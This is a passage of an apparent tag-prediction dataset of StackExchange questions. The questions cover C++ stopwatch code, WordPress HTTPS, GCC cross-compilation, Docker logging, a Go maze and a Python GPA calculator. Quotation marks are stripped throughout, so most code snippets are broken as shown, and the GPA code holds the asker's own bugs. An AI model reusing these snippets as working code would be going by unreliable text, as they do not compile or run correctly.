m_seconds;}/*|----VIRTUAL_FUNCTIONS_END----|*//*|----PUBLIC_FUNCTIONS_END----|*//*|----DIGITAL_STOP_WATCH_FUNCTIONS_END----|*//*|---SEGMENTED_STOP_WATCH_FUNCTIONS_START---|*//*|---PUBLIC_FUNCTIONS_START---|*//*|---VIRTUAL_FUNCTIONS_START---|*/void SegmentedStopWatch::printTime() {    setDigitsToCurrentTime();    printHours();    printColon(m_watchXPos + 10, m_watchYPos);    printMinutes();    printColon(m_watchXPos + 22, m_watchYPos);    printSeconds();}/*|----VIRTUAL_FUNCTIONS_END----|*//*|----PUBLIC_FUNCTIONS_END----|*//*|---PRIVATE_FUNCTIONS_START---|*/void SegmentedStopWatch::printDigitAtLoc(Digit digArr[], int index, int x, int y) const{    digArr[index].setDigitXY(x + index * digitPadding, y);    digArr[index].printDigit();}void SegmentedStopWatch::printColon(int x, int y){    Console::putSymbol(x, y + 1, '.');    Console::putSymbol(x, y + 2, '.');}void SegmentedStopWatch::printSeconds(){    printDigitAtLoc(m_stopWatchDigits, Fifth, m_watchXPos + timePadding * 2, m_watchYPos);    printDigitAtLoc(m_stopWatchDigits, Sixth, m_watchXPos + timePadding * 2, m_watchYPos);}void SegmentedStopWatch::printMinutes(){    printDigitAtLoc(m_stopWatchDigits, Third, m_watchXPos + timePadding, m_watchYPos);    printDigitAtLoc(m_stopWatchDigits, Fourth, m_watchXPos + timePadding, m_watchYPos);}void SegmentedStopWatch::printHours(){    printDigitAtLoc(m_stopWatchDigits, First, m_watchXPos, m_watchYPos);    printDigitAtLoc(m_stopWatchDigits, Second, m_watchXPos, m_watchYPos);}void SegmentedStopWatch::set(Digit digArr[], int startIndex, int unit){    if (unit < 10) digArr[startIndex - 1] = 0;    else digArr[startIndex - 1] = unit / 10;         digArr[startIndex]     = unit % 10;}void SegmentedStopWatch::setDigitsToCurrentTime(){    setHours();    setMinutes();    setSeconds();}void SegmentedStopWatch::setSeconds(){    set(m_stopWatchDigits, secondsIndexStart, m_seconds);}void SegmentedStopWatch::setMinutes(){    set(m_stopWatchDigits, minutesIndexStart, m_minutes);}void SegmentedStopWatch::setHours(){    set(m_stopWatchDigits, hoursIndexStart, m_hours);}/*|----PRIVATE_FUNCTIONS_END----|*//*|----SEGMENTED_STOP_WATCH_FUNCTIONS_END----|*/Source.cpp:#includeStopWatch.h#includeConsole.h //for Console::gotoxy#include<thread>   //for this_thread::sleep_forint main(){    std::unique_ptr<Factory> segFact{ std::make_unique<SegmentedStopWatchFactory>() };    std::unique_ptr<Factory> digFact{ std::make_unique<DigitalStopWatchFactory>() };    std::unique_ptr<StopWatch> stoppers[2];    stoppers[0] = segFact->createStopWatch();    stoppers[1] = digFact->createStopWatch();    stoppers[0]->setStopWatchXY(5, 5);    //to test the second stopper simply change stoppers[0] to stoppers[1]    stoppers[0]->countDownFrom(12); //test countdown    //stoppers[0]->countDownFrom(60 * 60 * 60 * 60); //overflow test    /*    stoppers[0]->start();    while (1)    {        stoppers[0]->updateTime();        stoppers[0]->printTime();        std::this_thread::sleep_for(std::chrono::milliseconds(200)); //this is only responsible for the refresh rate, the lower the better    }//note that no waiting at all will result in visible reprinting.    */    /*    int timer = 9;     stoppers[0]->start();    do    {        stoppers[0]->updateTime();        stoppers[0]->printTime();        std::this_thread::sleep_for(std::chrono::seconds(1));    }while (--timer);    stoppers[0]->stop(); //test stop    std::this_thread::sleep_for(std::chrono::seconds(3));    timer = 9;    stoppers[0]->start();    do    {        stoppers[0]->updateTime();        stoppers[0]->printTime();        std::this_thread::sleep_for(std::chrono::seconds(1));    }while (--timer);    */    /*    int timer = 9;    stoppers[0]->start();    do    {        stoppers[0]->updateTime();        stoppers[0]->printTime();        std::this_thread::sleep_for(std::chrono::seconds(1));    }while (--timer);    stoppers[0]->reset(); //test reset    std::this_thread::sleep_for(std::chrono::seconds(3));    timer = 9;    stoppers[0]->start();    do    {        stoppers[0]->updateTime();        stoppers[0]->printTime();        std::this_thread::sleep_for(std::chrono::seconds(1));    }while (--timer);    */    /*    int timer = 9;    stoppers[0]->start();    do    {        stoppers[0]->updateTime();        stoppers[0]->printTime();        std::this_thread::sleep_for(std::chrono::seconds(1));    } while (--timer);    stoppers[0]->lap(); //lap reset    stoppers[0]->stop();    std::this_thread::sleep_for(std::chrono::seconds(3));    timer = 9;    stoppers[0]->start();    do    {        stoppers[0]->updateTime();        stoppers[0]->printTime();        std::this_thread::sleep_for(std::chrono::seconds(1));    } while (--timer);    stoppers[0]->lap();    stoppers[0]->stop();    Console::gotoxy(0, 0);    std::cout << m_elapsed:  << stoppers[0]->getElapsed() << '\\n';    std::cout << First lap:  << stoppers[0]->getLapTimes()[0] << '\\n';    std::cout << Second lap:  << stoppers[0]->getLapTimes()[1] << '\\n';    */    return 0;}",
    "target": "c++;object oriented;design patterns;datetime;polymorphism"
  },
  {
    "id": "_webmaster.108096",
    "source": "When converting a WordPress site from HTTP to HTTPS, do all hard-coded HTTP references need to be updated? <eos> We have a Wordpress HTTP site which we wish to convert to HTTPS or SSL. Do we have to find all mentions of hard coded HTTP resources or can we simply do a 301 redirect in .htaccess, and how do we do that?We are a not for profit website and I have limited knowledge of Wordpress and webmastering (although I am a power user of browsers and can edit basic html).",
    "target": "redirects;wordpress;https;http;conversions"
  },
  {
    "id": "_softwareengineering.254016",
    "source": "How can I make sense of the word Functor from a semantic standpoint? <eos> When facing new programming jargon words, I first try to reason about them from an semantic and etymological standpoint when possible (that is, when they aren't obscure acronyms). For instance, you can get the beginning of a hint of what things like Polymorphism or even Monad are about with the help of a little Greek/Latin. At the very least, once you've learned the concept, the word itself appears to go along with it well. I guess that's part of why we name things names, to make mental representations and associations more fluent.I found Functor to be a tougher nut to crack. Not so much the C++ meaning -- an object that acts (-or) as a function (funct-), but the various functional meanings (in ML, Haskell) definitely left me puzzled.From the (mathematics) Functor Wikipedia article, it seems the word was borrowed from linguistics. I think I get what a function word or functor means in that context - a word that makes function as opposed to a word that makes sense. But I can't really relate that to the notion of Functor in category theory, let alone functional programming. I imagined a Functor to be something that creates functions, or behaves like a function, or short for functional constructor, but none of those seems to fit...How do experienced functional programmers reason about this ? Do they just need any label to put in front of a concept and be fine with it ? Generally speaking, isn't it partly why advanced functional programming is hard to grasp for mere mortals compared to, say, OO -- very abstract in that you can't relate it to anything familiar ?Note that I don't need a definition of Functor, only an explanation that would allow me to relate it to something more tangible, if there is any.",
    "target": "functional programming;math;theory;semantics"
  },
  {
    "id": "_unix.287643",
    "source": "GCC 4.8 compilation error: cannot find the system header directory <eos> I'm trying to compile GCC 4.8.3. I have read the documentation carefully but I'm still unable to cross compile it for 64bit system. I have also gone through this guide. But my requirement is to build GCC in /tmp/xxx directory. But the --with-sysroot & --with-native-system-header-dir flags are messing up the compilation. According to the documentation of GCC, I need to use --with-sysroot flag along with --with-native-system-header-dir.--with-system-header-dir accepts a directory name where the header files are installed. In my case it is ${TOOLS_DIR} and this should be an absolute path, which it is. And, --with-sysroot requires the root path of the folder where the compilation is being done. In my case, it is ${INSTALL_DIR}.INSTALL_DIR=/tmp/gcc-compileTOOLS_DIR=${INSTALL_DIR}/toolsAccording to the Linuxfromscratch guide, I should create a folder on the root system of the host. But in order to do that I will need sudo permission which I don't have. So, I thought to compile GCC in a subdirectory rather than what was mentioned in the book (because all the users get read/write permission for /tmp directory).Now, GCC stops with an error that it cannot find the system header directory. And, it tries to search in /tmp/gcc-compile/tmp/gcc-compile/tools/include, which is the wrong path.The options that I have used are:sed -i s#/tools#${TOOLS_DIR}#g ../gcc-4.8.3-pure64_specs-1.patchpatch -Np1 -i ../gcc-4.8.3-branch_update-1.patchpatch -Np1 -i ../gcc-4.8.3-pure64_specs-1.patchprintf '\\n#undef STANDARD_STARTFILE_PREFIX_1\\n#define STANDARD_STARTFILE_PREFIX_1 %s/lib/\\n' ${TOOLS_DIR} >> gcc/config/linux.hprintf '\\n#undef STANDARD_STARTFILE_PREFIX_2\\n#define STANDARD_STARTFILE_PREFIX_2 \\n' >> gcc/config/linux.hmkdir   ${BUILD_DIR}  &&cd      ${BUILD_DIR}  &&AR=ar LDFLAGS=-Wl,-rpath,${CROSS_DIR}/lib   \\../configure --prefix=${CROSS_DIR}            \\             --build=${HOST}                  \\             --target=${TARGET}               \\             --host=${HOST}                   \\             --with-sysroot=${INSTALL_DIR}    \\             --with-local-prefix=${TOOLS_DIR} \\             --with-native-system-header-dir=${TOOLS_DIR}/include \\             --disable-nls                    \\             --disable-static                 \\             --enable-languages=c,c++         \\             --enable-__cxa_atexit            \\             --enable-threads=posix           \\             --disable-multilib               \\             --with-mpc=${CROSS_DIR}          \\             --with-mpfr=${CROSS_DIR}         \\             --with-gmp=${CROSS_DIR}          \\             --with-cloog=${CROSS_DIR}        \\             --with-isl=${CROSS_DIR}          \\             --with-system-zlib               \\             --enable-checking=release        \\             --enable-libstdcxx-timeWhile setting the options, I have written ${TOOLS_DIR}/include, then why is it the GCC is trying to look into ${INSTALL_DIR}/${TOOLS_DIR}/include? Can somebody direct me in the right direction?OUTPUTThe directory that should contain system headers does not exist:/tmp/gcc-compile/tmp/gcc-compile/tools/includemake[2]: *** [stmp-fixinc] Error 1make[2]: *** Waiting for unfinished jobs....rm gcc.podmake[2]: Leaving directory `/tmp/gcc-compile/cross-compile-tools/gcc-    final/gcc-4.8.3/gcc-build/gcc'make[1]: *** [all-gcc] Error 2make[1]: Leaving directory `/tmp/gcc-compile/cross-compile-tools/gcc-final/gcc-4.8.3/gcc-build'make: *** [all] Error 2",
    "target": "compiling;gcc;cross compilation"
  },
  {
    "id": "_softwareengineering.267053",
    "source": "Correctly disposing objects upon server termination <eos> I am working on a large C++ project. It consists in a server that exposes a REST API, providing a simple and user-friendly interface for a very broad system comprising many other servers. The codebase is quite large and complex, and evolved through time without a proper design upfront. My task is to implement new features and refactor/fix the old code in order to make it more stable and reliable.At the moment, the server creates a number of long-living objects that are never terminated nor disposed when the process terminates. This makes Valgrind almost unusable for leak detection, as it is impossible to distinguish between the thousands of (questionably) legitimate leaks from the dangerous ones.My idea is to ensure that all objects are disposed before termination, but when I made this proposal, my colleagues and my boss opposed me pointing out that the OS is going to free that memory anyway (which is obvious to everybody) and disposing the objects will slow down the shutdown of the server (which, at the moment, is basically a call to std::exit). I replied that having a clean shutdown procedure does not necessarily imply that one must use it. We can always call std::quick_exit or just kill -9 the process if we feel impatient.They replied most Linux daemons and processes don't bother freeing up memory at shutdown. While I can see that, it is also true that our project does need accurate memory debugging, as I already found memory corruption, double frees and uninitialised variables.What are your thoughts? Am I pursuing a pointless endeavour? If not, how can I convince my colleagues and my boss? If so, why, and what should I do instead?",
    "target": "c++;debugging;memory"
  },
  {
    "id": "_unix.264021",
    "source": "How to configure logging inside a Docker container? <eos> I was trying to dockerize (into Debian 8.2) an OpenVPN server (yes, I do know, there already are such containers) but something went wrong inside the container and the server failed to start.I decided to inspect logs but /var/log/syslog (OpenVPN logs here on my host machine) was missing inside the container.I thought that rsyslog was not istalled and added its installation before OpenVPN installation to the Dockerfile. But this had no effect, the syslog was still missing.My Dockerfile is:FROM debian:8.2USER rootEXPOSE 53/udpEXPOSE 1194/udpEXPOSE 443/tcpRUN apt-get updateRUN apt-get install -y rsyslogRUN apt-get install -y openvpn# ...# Some configuration stuff# ...ENTRYPOINT service openvpn start && shThe questions are:Why does OpenVPN logs to syslog after default installation on my host Debian 8.2 and doesn't do it inside a container? I didn't configure anything on my host machine to force OpenVPN log to syslog. It was a default behavior.How do I configure logging of the OpenVPN server running inside a docker container?",
    "target": "debian;syslog;docker;rsyslog;containers"
  },
  {
    "id": "_webapps.20869",
    "source": "Go Back to Default Tumblr Layout <eos> So after gratuitous theme installations and customizations my tumblr site just isn't looking how I want it to.  I've decided to just do the theme myself, but now I have one on there with all this extra stuff.How can I go back to default layout so I have a clean slate to work on?",
    "target": "tumblr;tumblr themes"
  },
  {
    "id": "_unix.190999",
    "source": "How to know su password <eos> You already know my question.I don't have su authority.So I want to know su password.I really(x100) don't know how to find it.I tried change direction(/etc/pam.d/su) and tried to delete auth  sufficient pam_wheel.so trust.But I could not do it,Because I don't have su authority.:-(so...Could you do me a favor?",
    "target": "security;root"
  },
  {
    "id": "_unix.136335",
    "source": "Trying To Get Data From Server HDD <eos> I had two CentOS 6.5 servers that I was running using the Plesk control panel. I have moved and decided not to use them no more but just buy my hosting. My new ISP blocks port 80 and the cost is insane to get it unblocked from them. I took out the server HDD and trying to use a Fedora 12 Live CD to just get the website files backed up. The issue I'm having is that the folder I need access to are all locked out. The error says I do not have permissions to view folder. When I go to permissions tab I'm being told I'm not the owner. I'm not good with command lines so is there a way to make myself the owner from the interface? ",
    "target": "fedora;permissions;data recovery"
  },
  {
    "id": "_cs.60987",
    "source": "Registering 3D-NIR image to thermal image and vice versa <eos> In the past I have thought a bit about how to register a NIR-image and a thermal image and noticed that this is not trivial - one statement was that if I had the depth information for each pixel, the task would be much easier.Now consider having a 3D-NIR camera (e.g. asus xtion) and a thermal camera and I want to map the thermal information to the depth map (the 3d cloud) or vice versa and the NIR information to the thermal information (and vice versa). I thought I could do it simply like this:Conduct a stereo camera calibration for the two cameras (-> R1,R2,T)Use R1, R2 and T to transform the 3D points from 3D-NIR to the thermal camera's coordinate systemUse the camera matrix of the thermal camera to project the 3D points to its image planeNow I know where the 3D points fall in the thermal image, which gives me a depth value (and intensity value, because the depth map and NIR-image are aligned) for each pixel in the thermal image.Which to me sounds similar to the procedure described in this answer by D.W..However, I can't find any article describing this method. Always there seems to be some form of feature matching step, e.g. here.Also, thinking about this, the above solution can not really work, I believe. Consider the case where the two cameras look at an object from different sides. The 3D camera will calculate the depth for a point p1 in the world. When projecting p1 to the thermal camera's image plane it will fall in pixel x. However, since the thermal camera looked at another side of the object, another point in the world p2 actually formed pixel x when the thermal camera took the image - and thats what the measured temperature in x is for (i.e., p1 and p2 roughly lie on a line viewed from the thermal camera).So, all in all:Is my statement that the outlined solution can't always work correct?Under which circumstances does the outlined solution work?What do I need to keep in mind when building the setup?How else to go about this problem? Thanks for reading this long post!",
    "target": "computer vision"
  },
  {
    "id": "_datascience.11695",
    "source": "Binning of Continous Predictor and Predicted Variables <eos> My problem has three categorical variables C1,C2, C3 and one continous variable X, predicting a continuous outcome Y. I can visualize the problem with the following reproducible code (apology for the badly written code):library(data.tree)i = expand.grid(c(A,B),c(C,D),c(E,F))i = i[order(i[,1],i[,2],i[,3]),]i[,4] = c(1:8)t = expand.grid(c(A,B),c(C,D),c(E,F),seq(0,1,0.1))t = t[order(t[,1],t[,2],t[,3]),]t = join(t,i, by = c(Var1,Var2,Var3))t$Var5 = runif(nrow(t))t$pathString <- with(t, paste(Tree, Var1, Var2, Var3, V4, sep=/))plot_tree <- as.Node(t)plot(plot_tree)ggplot(data = t, aes(x=Var4, y=Var5)) + geom_line() + facet_grid(~V4)The tree categorical variables show 8 possible path combinations:And within each path there is a distribution of Y depending on a continuous variable X:I would like to bin both the continuous Y and X variables such that I am left with a more concise decision tree. There is method to this madness as in my actual problem, some categorical paths will become insignificant due to no movement in the predicted Y beyond the established volatility threshold of 5%.I can manually obtain bins by brute force, but is there a binning algorithm that supports binning of both predicted and predictor variables? I have looked at smbinning and my knowledge in this area of algorithms is limited. My actual problem has many categorical and continuous variables resulting in a more complex structure, but I would like to convert it to a decision tree result which will help me understand the significance and movement of variables better. ",
    "target": "r;data mining;decision trees"
  },
  {
    "id": "_unix.248265",
    "source": "Alternative to script command getting directory names (using ls & awk) <eos> Related to my question about awk being ignored by cron, are there any alternatives to awk? This is the line in question:for dirlist in `ls -l $WEBFOLDER | awk '$1 ~ /d/ {print $10 }' `I don't know awk so I don't understand the $1 ~ /d/ part, but I think what it does is that it prints the 10th column out of the ls -l result. As I can't use awk as of current, is there an alternative to getting the directory names without using awk?EDIT: The line above only outputs the names. No lines or dots, just the names.",
    "target": "shell script"
  },
  {
    "id": "_softwareengineering.116541",
    "source": "Does Groovy follow Tennent's Correspondence Principle? <eos> Here's an interesting discussion of Tennent's Correspondence Principle, and a brief description from Neal Gafter:The principle dictates that an expression or statement, when wrapped in a closure and then immediately invoked, ought to have the same meaning as it did before being wrapped in a closure. Any change in semantics when wrapping code in a closure is likely a flaw in the language.Does the Groovy language follow this principle?",
    "target": "language design;groovy;closures"
  },
  {
    "id": "_unix.137492",
    "source": "Load shared objects relative to executable path <eos> I'm trying to get a C application to load shared objects from a relative directory regardless of where I call it from. So far it only works if I'm in the same directory as the executable when I call it:~/prog$ ./my_programSuccess~/prog$ cd ..~$ ./prog/my_program./prog/my_program: error while loading shared libraries: libs/libmysharedobject.so: cannot open shared object file: No such file or directoryAs you can guess from the output above, the shared object is stored under the ~/prog/libs/ directory.  Here's what the relevant gcc calls look like:gcc -std=c99 -ggdb -Wall -pedantic -Isrc    -fPIC -shared -Wl,-soname,libs/libmysharedogbject.so    -o libs/libmysharedobject.so libs/mysharedobject.c[...]gcc [CFLAGS omitted] -o my_program main.c    build/src/my_program.o build/src/common.o    -lm -Llibs -lmysharedobjectHere's the top of the output from readelf -d my_program:Dynamic section at offset 0x6660 contains 26 entries:  Tag        Type                         Name/Value 0x0000000000000001 (NEEDED)             Shared library: [libm.so.6] 0x0000000000000001 (NEEDED)             Shared library: [libs/libmysharedobject.so] 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]I have tried adding -Wl,-z,origin,-rpath='$ORIGIN', which causes the following lines to show up in readelf's output: 0x000000000000000f (RPATH)              Library rpath: [$ORIGIN][...] 0x000000006ffffffb (FLAGS_1)            Flags: ORIGINBut it doesn't seem to solve my problem. I've also tried setting rpath to $ORIGIN/libs, ., and ./libs, all to no avail. (UPDATE: $(CURDIR) doesn't have any effect either. This surprises me, since it's expanded to an absolute path.)Is there a way to get my executable to find its shared objects regardless of the directory from which it's invoked, preferably without having the end user set LD_LIBRARY_PATH every time? Or am I trying to do something that Linux doesn't support?",
    "target": "compiling;dynamic linking"
  },
  {
    "id": "_unix.328882",
    "source": "how to add new value to beginning of array in bash? <eos> I have an array containing some element ,but i want to push new items to beginning of array .How to achieve it ?",
    "target": "bash;shell script;array"
  },
  {
    "id": "_codereview.15539",
    "source": "Creating random maze in Go <eos> /*Create a random maze*/package mainimport (    fmt    math/rand    time)const (    mazewidth   = 15    mazeheight  = 15)type room struct {    x, y int}func (r room) String() string {    return fmt.Sprintf((%d,%d), r.x, r.y)}func (r room) id() int {    return (r.y * mazewidth) + r.x}// whetwher walls are  open or not.// There are (num_rooms * 2) walls. Some are on borders, but nevermind them ;)type wallregister [mazewidth * mazeheight * 2]boolvar wr = wallregister{}// rooms are visited or nottype roomregister [mazewidth * mazeheight]boolvar rr = roomregister{}func main() {    rand.Seed(time.Now().Unix())    stack := make([]room, 0, mazewidth*mazeheight)    start := room{0, 0}    // mark start position visited    rr[start.id()] = true    // put start position on stack     stack = append(stack, room{0, 0})    for len(stack) > 0 {        // current node is in top of the stack        current := stack[len(stack)-1]        // Slice of neighbors we can move        availneighbrs := current.nonvisitedneighbors()        // cannot move. Remove this room from stack and continue        if len(availneighbrs) < 1 {            stack = stack[:len(stack)-1]            continue        }        // pick a random room to move.        next := availneighbrs[rand.Intn(len(availneighbrs))]        // mark next visited        rr[next.id()] = true        // open wall between current and next:        first, second := orderrooms(current, next)        // second is either at the right or bottom of first.        if second.x == first.x+1 {            wr[first.id()*2] = true        } else if second.y == first.y+1 {            wr[first.id()*2+1] = true        } else { // probably impossible or maybe not...            panic(Wot?!?)        }        // push next to stack        stack = append(stack, next)    }    // print maze    // print upper border    for x := 0; x < mazewidth; x++ {        if x == 0 {            fmt.Printf(   )        } else {            fmt.Printf(_ )        }    }    fmt.Println()    for y := 0; y < mazeheight; y++ {        fmt.Printf(|) // left border        for x := 0; x < mazewidth; x++ {            id := room{x, y}.id()            right := |            bottom := _            if wr[id*2] {                right =              }            if wr[id*2+1] {                bottom =              }            if x == mazewidth-1 && y == mazeheight-1 {                right =              }            fmt.Printf(%s%s, bottom, right)        }        fmt.Println()    }}// return slice of neighbor roomsfunc (r room) neighbors() []room {    rslice := make([]room, 0, 4)    if r.x < mazewidth-1 {        rslice = append(rslice, room{r.x + 1, r.y})    }    if r.x > 0 {        rslice = append(rslice, room{r.x - 1, r.y})    }    if r.y < mazeheight-1 {        rslice = append(rslice, room{r.x, r.y + 1})    }    if r.y > 0 {        rslice = append(rslice, room{r.x, r.y - 1})    }    return rslice}// return rooms that are not visited yetfunc (r room) nonvisitedneighbors() []room {    rslice := make([]room, 0, 4)    for _, r := range r.neighbors() {        if rr[r.id()] == false {            rslice = append(rslice, r)        }    }    return rslice}// order to rooms by closeness to origin (upperleft)func orderrooms(room1, room2 room) (room, room) {    dist1 := room1.x*room1.x + room1.y*room1.y    dist2 := room2.x*room2.x + room2.y*room2.y    if dist1 < dist2 {        return room1, room2    }    return room2, room1}http://play.golang.org/p/8W_FbBfUjb (You can run it here. But since time.Now() is fixed there, you will always get same maze.)In any aspect of it, how does it look?",
    "target": "random;go"
  },
  {
    "id": "_codereview.75799",
    "source": "Getting a 4.0 GPA <eos> This is my code, for calculating a GPA for 7 subjects. It works, but is there a better way? Any hints on making it more flexible?from __future__ import divisionimport stringprint This program will calculate a Semester GPA for a given set of courses. Enter 0 in all inputs, if you want to skip extra courses.\\ncname1 = raw_input(First course name: )while True:    cred1 = raw_input(First course credit: )    try:        i = int(cred1)        break    except ValueError:        print 'Invalid input, Should be an positive interger'grade1 = raw_input(First course grade: )choice1 = grade1while choice1 not in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]:    print 'Invalid choice'    grade1 = raw_input(First course grade: )    users_turn = choice1 in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]    choice1 = grade1cname2 = raw_input(Second course name: )while True:    cred2 = raw_input(Second course credit: )    try:        i = int(cred2)        break    except ValueError:        print 'Invalid input, Should be an positive interger'grade2 = raw_input(Second course grade: )choice2 = grade2while choice2 not in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]:    print 'Invalid choice'    grade2 = raw_input(Second course grade: )    users_turn = choice2 in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]    choice2 = grade2cname3 = raw_input(Third course name: )while True:    cred3 = raw_input(Third course credit: )    try:        i = int(cred3)        break    except ValueError:        print 'Invalid input, Should be an positive interger'grade3 = raw_input(Third course grade: )choice3 = grade3while choice3 not in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]:    print 'Invalid choice'    grade3 = raw_input(Third course grade: )    users_turn = choice3 in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]    choice3 = grade3cname4 = raw_input(Fourth course name: )while True:    cred4 = raw_input(Fourth course credit: )    try:        i = int(cred4)        break    except ValueError:        print 'Invalid input, Should be an positive interger'grade4 = raw_input(Fourth course grade: )choice4 = grade4while choice4 not in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]:    print 'Invalid choice'    grade4 = raw_input(Fourth course grade: )    users_turn = choice4 in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]    choice4 = grade4cname5 = raw_input(Fifth course name: )while True:    cred5 = raw_input(Fifth course credit: )    try:        i = int(cred5)        break    except ValueError:        print 'Invalid input, Should be an positive interger'grade5 = raw_input(Fifth course grade: )choice5 = grade5while choice5 not in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]:    print 'Invalid choice'    grade5 = raw_input(Fifth course grade: )    users_turn = choice5 in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]    choice5 = grade5cname6 = raw_input(Sixth course name: )while True:    cred6 = raw_input(Sixth course credit: )    try:        i = int(cred6)        break    except ValueError:        print 'Invalid input, Should be an positive interger'grade6 = raw_input(Sixth course grade: )choice6 = grade6while choice6 not in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]:    print 'Invalid choice'    grade6 = raw_input(Sixth course grade: )    users_turn = choice6 in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]    choice6 = grade6cname7 = raw_input(Seventh course name: )while True:    cred7 = raw_input(Seventh course credit: )    try:        i = int(cred7)        break    except ValueError:        print 'Invalid input, Should be an positive interger'grade7 = raw_input(Seventh course grade: )choice7 = grade7while choice7 not in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]:    print 'Invalid choice'    grade7 = raw_input(Seventh course grade: )    users_turn = choice7 in [A+, a+, A, a,A-, a-, B+, b+, B, b, B-, b-, C+, c+, C, c,C-, c-, D+, d+, D, d, D-, d-, FAIL, fail]    choice7 = grade7totalGPA = 0.0overallGPA = 0.0cred1i = string.atoi(cred1)cred2i = string.atoi(cred2)cred3i = string.atoi(cred3)cred4i = string.atoi(cred4)cred5i = string.atoi(cred5)cred6i = string.atoi(cred6)cred7i = string.atoi(cred7)if grade1 in {A+, a+, A, a}:    c1points = (4.0*cred1i)elif grade1 in {A-, a-}:    c1points = (3.67*cred1i)elif grade1 in {B+, b+}:     c1points = (3.33*cred1i)elif grade1 in {B, b}:    c1points = (3.0*cred1i)elif grade1 in {B-, b-}:    c1points = (2.67*cred1i)elif grade1 in {C+, c+}:    c1points = (2.33*cred1i)elif grade1 in {C, c}:    c1points = (2.0*cred1i)elif grade1 in {C-, c-}:    c1points = (1.67*cred1i)elif grade1 in {D+, d+}:    c1points = (1.33*cred1i)elif grade1 in {D, d}:    c1points = (1.0*cred1i)else:    c1points = 0.0if grade2 in {A+, a+, A, a}:    c2points = (4.0*cred2i)elif grade2 in {A-, a-}:    c2points = (3.67*cred2i)elif grade2 in {B+, b+}:     c2points = (3.33*cred2i)elif grade2 in {B, b}:    c2points = (3.0*cred2i)elif grade2 in {B-, b-}:    c2points = (2.67*cred2i)elif grade2 in {C+, c+}:    c2points = (2.33*cred2i)elif grade2 in {C, c}:    c2points = (2.0*cred2i)elif grade2 in {C-, c-}:    c2points = (1.67*cred2i)elif grade2 in {D+, d+}:    c2points = (1.33*cred2i)elif grade2 in {D, d}:    c2points = (1.0*cred2i)else:    c2points = 0.0if grade3 in {A+, a+, A, a}:    c3points = (4.0*cred3i)elif grade3 in {A-, a-}:    c3points = (3.67*cred3i)elif grade3 in {B+, b+}:     c3points = (3.33*cred3i)elif grade3 in {B, b}:    c3points = (3.0*cred3i)elif grade3 in {B-, b-}:    c3points = (2.67*cred3i)elif grade3 in {C+, c+}:    c3points = (2.33*cred3i)elif grade3 in {C, c}:    c3points = (2.0*cred3i)elif grade3 in {C-, c-}:    c3points = (1.67*cred3i)elif grade3 in {D+, d+}:    c3points = (1.33*cred3i)elif grade3 in {D, d}:    c3points = (1.0*cred3i)else:    c3points = 0.0if grade4 in {A+, a+, A, a}:    c4points = (4.0*cred4i)elif grade4 in {A-, a-}:    c4points = (3.67*cred4i)elif grade4 in {B+, b+}:     c4points = (3.33*cred4i)elif grade4 in {B, b}:    c4points = (3.0*cred4i)elif grade4 in {B-, b-}:    c1points = (2.67*cred4i)elif grade4 in {C+, c+}:    c4points = (2.33*cred4i)elif grade4 in {C, c}:    c4points = (2.0*cred4i)elif grade4 in {C-, c-}:    c1points = (1.67*cred4i)elif grade4 in {D+, d+}:    c4points = (1.33*cred4i)elif grade4 in {D, d}:    c4points = (1.0*cred4i)else:    c4points = 0.0if grade5 in {A+, a+, A, a}:    c5points = (4.0*cred5i)elif grade5 in {A-, a-}:    c5points = (3.67*cred5i)elif grade5 in {B+, b+}:     c5points = (3.33*cred5i)elif grade5 in {B, b}:    c5points = (3.0*cred5i)elif grade5 in {B-, b-}:    c5points = (2.67*cred5i)elif grade5 in {C+, c+}:    c5points = (2.33*cred5i)elif grade5 in {C, c}:    c5points = (2.0*cred5i)elif grade5 in {C-, c-}:    c5points = (1.67*cred5i)elif grade5 in {D+, d+}:    c5points = (1.33*cred5i)elif grade5 in {D, d}:    c5points = (1.0*cred5i)else:    c5points = 0.0if grade6 in {A+, a+, A, a}:    c6points = (4.0*cred6i)elif grade6 in {A-, a-}:    c6points = (3.67*cred6i)elif grade6 in {B+, b+}:     c6points = (3.33*cred6i)elif grade6 in {B, b}:    c6points = (3.0*cred6i)elif grade6 in {B-, b-}:    c6points = (2.67*cred6i)elif grade6 in {C+, c+}:    c6points = (2.33*cred6i)elif grade6 in {C, c}:    c6points = (2.0*cred6i)elif grade6 in {C-, c-}:    c6points = (1.67*cred6i)elif grade6 in {D+, d+}:    c6points = (1.33*cred6i)elif grade6 in {D, d}:    c6points = (1.0*cred6i)else:    c6points = 0.0if grade7 in {A+, a+, A, a}:    c7points = (4.0*cred7i)elif grade7 in {A-, a-}:    c7points = (3.67*cred7i)elif grade7 in {B+, b+}:     c7points = (3.33*cred7i)elif grade7 in {B, b}:    c7points = (3.0*cred7i)elif grade7 